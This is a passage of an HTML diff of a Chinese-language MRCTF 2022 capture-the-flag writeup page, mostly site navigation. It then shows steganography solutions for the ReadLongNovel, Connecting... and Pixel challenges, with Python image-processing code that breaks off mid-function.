+      <a href="../d3ctf2022/" class="md-nav__link">
+        D3CTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%2Actf2022/" class="md-nav__link">
+        *CTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          MRCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        MRCTF 2022
+      </a>
+      
+        
+  
+  <nav class="md-nav md-nav--secondary " aria-label="目录">
+    
+    
+    
+      
+    
+    
+      <label class="md-nav__title" for="__toc">
+        <span class="md-nav__icon md-icon"></span>
+        目录
+      </label>
+      <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+        
+          <li class="md-nav__item">
+  <a href="#readlongnovel" class="md-nav__link">
+    ReadLongNovel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting" class="md-nav__link">
+    Connecting...
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pixel" class="md-nav__link">
+    Pixel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spy_dog" class="md-nav__link">
+    Spy_Dog
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pdd" class="md-nav__link">
+    pdd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sandsandsand" class="md-nav__link">
+    SandSandSand
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jop_gadget" class="md-nav__link">
+    JOP_Gadget
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bleach" class="md-nav__link">
+    Bleach!
+  </a>
+  
+</li>
+        
+      </ul>
+    
+  </nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../misc/">Miscellaneous</a>
+          
+            <label for="__nav_5">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Miscellaneous" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Miscellaneous
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/mkdocs/" class="md-nav__link">
+        mkdocs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/hexo/" class="md-nav__link">
+        hexo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/sphinx/" class="md-nav__link">
+        sphinx
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                      
+                    </div>
+                  </div>
+                </div>
+              
+              
+                <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                  <div class="md-sidebar__scrollwrap">
+                    <div class="md-sidebar__inner">
+                      
+                        
+  
+  <nav class="md-nav md-nav--secondary " aria-label="目录">
+    
+    
+    
+      
+    
+    
+      <label class="md-nav__title" for="__toc">
+        <span class="md-nav__icon md-icon"></span>
+        目录
+      </label>
+      <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+        
+          <li class="md-nav__item">
+  <a href="#readlongnovel" class="md-nav__link">
+    ReadLongNovel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting" class="md-nav__link">
+    Connecting...
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pixel" class="md-nav__link">
+    Pixel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spy_dog" class="md-nav__link">
+    Spy_Dog
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pdd" class="md-nav__link">
+    pdd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sandsandsand" class="md-nav__link">
+    SandSandSand
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jop_gadget" class="md-nav__link">
+    JOP_Gadget
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bleach" class="md-nav__link">
+    Bleach!
+  </a>
+  
+</li>
+        
+      </ul>
+    
+  </nav>
+                      
+                    </div>
+                  </div>
+                </div>
+              
+            
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+<a href="https://github.com/TonyCrane/note/tree/master/docs/writeups/mrctf2022.md" title="编辑此页" class="md-content__button md-icon">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+</a>
+
+
+<h1 id="mrctf-2022-writeup">MRCTF 2022 Writeup<a class="headerlink" href="#mrctf-2022-writeup" title="Permanent link">&para;</a></h1>
+<div class="admonition abstract">
+<p class="admonition-title">Abstract</p>
+<p>受高中学长邀请来打的比赛，题目质量很高，打的很爽，队里大手子强的很，带着拿了第一
+<img alt="" src="/assets/images/writeups/mrctf2022/rank.png" /></p>
+<p>misc 有一道题没做出来，看了 nano 的 wp 后补出来了，这次比赛也参与了一下 eth 题目</p>
+</div>
+<hr />
+<h2 id="readlongnovel">ReadLongNovel<a class="headerlink" href="#readlongnovel" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" /></p>
+<p>由于时间够长、题库不大，所以直接网络搜索 + 原文 txt 搜索就可以手动搞差不多</p>
+<p>flag: <strong>MRCTF{愿您的+文明+永远进步}</strong></p>
+<hr />
+<h2 id="connecting">Connecting...<a class="headerlink" href="#connecting" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" /></p>
+<p>obj 有个数据不改的话 blender 加载不出来（4d33 不是十进制数）</p>
+<p>然后发现所有 f 都是 / 分隔的三个数相同，只有这一行不相同</p>
+<p><img alt="Untitled" src="/assets/images/writeups/mrctf2022/Untitled%203.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="__codelineno-0-1"></a><span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">]:</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="__codelineno-0-2"></a><span class="o">...</span>     <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">each</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="__codelineno-0-3"></a><span class="o">...</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="__codelineno-0-4"></a><span class="n">M3R7aIcTF</span>
+</code></pre></div>
+<p>图片开头 xml 信息中发现：Thank Fabien Petitcolas For his work.</p>
+<p>搜到 mp3stego，用它和密码 <code>M3R7aIcTF</code> 来解密 wav 文件（其实是 mp3）得到：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="__codelineno-1-1"></a><span class="n">FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I</span>
+</code></pre></div>
+<p>base32： <code>(M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!}</code></p>
+<p>flag: <strong>MRCTF{WIFI_2022_connect_successfully!}</strong></p>
+<hr />
+<h2 id="pixel">Pixel<a class="headerlink" href="#pixel" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" /></p>
+<p>blue plane 看起来很有问题，把 512 张图片的所有点点叠加（blue 各个 plane 都差不多，这个是 blue 3）</p>
+<p><img alt="blue3.png" src="/assets/images/writeups/mrctf2022/blue3.png" /></p>
+<p>再根据 hint 直接搞到原图：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="__codelineno-2-1"></a><span class="n">img2</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;RGB&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mi">512</span><span class="p">,</span> <span class="mi">512</span><span class="p">))</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="__codelineno-2-2"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">512</span><span class="p">):</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="__codelineno-2-3"></a>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">512</span><span class="p">):</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="__codelineno-2-4"></a>        <span class="n">img2</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">),</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="__codelineno-2-5"></a><span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">512</span><span class="p">)):</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="__codelineno-2-6"></a>    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;pixel/</span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">.png&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="__codelineno-2-7"></a>    <span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">size</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="__codelineno-2-8"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">width</span><span class="p">):</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="__codelineno-2-9"></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="__codelineno-2-10"></a>            <span class="n">R</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">B</span> <span class="o">=</span> <span class="n">pix</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">))</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="__codelineno-2-11"></a>            <span class="k">if</span> <span class="n">B</span> <span class="o">!=</span> <span class="mi">255</span><span class="p">:</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="__codelineno-2-12"></a>                <span class="n">img2</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">),</span> <span class="n">pix</span><span class="p">)</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="__codelineno-2-13"></a><span class="n">img2</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;zigzag.png&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="test.png" src="/assets/images/writeups/mrctf2022/test.png" /></p>
+<p>red plane 0 有问题</p>
+<p><img alt="red0.bmp" src="/assets/images/writeups/mrctf2022/red0.bmp" /></p>
+<p>根据 zigzag 推测需要进行一些 zigzag 操作（即像素点顺序的转换）网上找找代码改一改</p>
+<details class="example">
+<summary>zigzag</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="__codelineno-3-1"></a><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="__codelineno-3-2"></a><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="__codelineno-3-4"></a><span class="k">def</span> <span class="nf">zigzag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="__codelineno-3-5"></a>    <span class="n">row</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="__codelineno-3-6"></a>    <span class="n">col</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="__codelineno-3-7"></a>    <span class="n">num</span> <span class="o">=</span> <span class="n">row</span> <span class="o">*</span> <span class="n">col</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="__codelineno-3-8"></a>    <span class="n">lst</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">num</span><span class="p">,)</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="__codelineno-3-9"></a>    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="__codelineno-3-10"></a>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="__codelineno-3-11"></a>    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="__codelineno-3-12"></a>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="__codelineno-3-13"></a>    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">row</span> <span class="ow">and</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">col</span> <span class="ow">and</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">num</span><span class="p">:</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="__codelineno-3-14"></a>        <span class="n">lst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="__codelineno-3-15"></a>        <span class="n">k</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="__codelineno-3-16"></a>        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="__codelineno-3-17"></a>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="__codelineno-3-18"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="__codelineno-3-19"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="__codelineno-3-20"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="__codelineno-3-21"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="__codelineno-3-22"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="__codelineno-3-23"></a>            <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="__codelineno-3-24"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="__codelineno-3-25"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="__codelineno-3-26"></a>        <span class="k">elif</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="__codelineno-3-27"></a>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="__codelineno-3-28"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="__codelineno-3-29"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="__codelineno-3-30"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="__codelineno-3-31"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="__codelineno-3-32"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="__codelineno-3-33"></a>            <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="__codelineno-3-34"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="__codelineno-3-35"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">-</span> <span class="mi">1</span>
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="__codelineno-3-36"></a>    <span class="k">return</span> <span class="n">lst</span>
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="__codelineno-3-37"></a>
+<a id="__codelineno-3-38" name="__codelineno-3-38" href="__codelineno-3-38"></a><span class="k">def</span> <span class="nf">dezigzag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-3-39" name="__codelineno-3-39" href="__codelineno-3-39"></a>    <span class="n">num</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-3-40" name="__codelineno-3-40" href="__codelineno-3-40"></a>    <span class="n">row</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span> <span class="o">**</span> <span class="mf">0.5</span><span class="p">)</span>
+<a id="__codelineno-3-41" name="__codelineno-3-41" href="__codelineno-3-41"></a>    <span class="n">col</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span> <span class="o">**</span> <span class="mf">0.5</span><span class="p">)</span>
+<a id="__codelineno-3-42" name="__codelineno-3-42" href="__codelineno-3-42"></a>    <span class="n">lst</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">row</span><span class="p">,</span> <span class="n">col</span><span class="p">))</span>
+<a id="__codelineno-3-43" name="__codelineno-3-43" href="__codelineno-3-43"></a>    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-44" name="__codelineno-3-44" href="__codelineno-3-44"></a>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-45" name="__codelineno-3-45" href="__codelineno-3-45"></a>    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-46" name="__codelineno-3-46" href="__codelineno-3-46"></a>
+<a id="__codelineno-3-47" name="__codelineno-3-47" href="__codelineno-3-47"></a>    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">row</span> <span class="ow">and</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">col</span> <span class="ow">and</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">num</span><span class="p">:</span>
+<a id="__codelineno-3-48" name="__codelineno-3-48" href="__codelineno-3-48"></a>        <span class="n">lst</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
+<a id="__codelineno-3-49" name="__codelineno-3-49" href="__codelineno-3-49"></a>        <span class="n">k</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-50" name="__codelineno-3-50" href="__codelineno-3-50"></a>        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-3-51" name="__codelineno-3-51" href="__codelineno-3-51"></a>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-52" name="__codelineno-3-52" href="__codelineno-3-52"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-53" name="__codelineno-3-53" href="__codelineno-3-53"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-54" name="__codelineno-3-54" href="__codelineno-3-54"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-55" name="__codelineno-3-55" href="__codelineno-3-55"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-56" name="__codelineno-3-56" href="__codelineno-3-56"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-57" name="__codelineno-3-57" href="__codelineno-3-57"></a>            <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-3-58" name="__codelineno-3-58" href="__codelineno-3-58"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+<a id="__codelineno-3-59" name="__codelineno-3-59" href="__codelineno-3-59"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-60" name="__codelineno-3-60" href="__codelineno-3-60"></a>        <span class="k">elif</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-3-61" name="__codelineno-3-61" href="__codelineno-3-61"></a>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-62" name="__codelineno-3-62" href="__codelineno-3-62"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-63" name="__codelineno-3-63" href="__codelineno-3-63"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
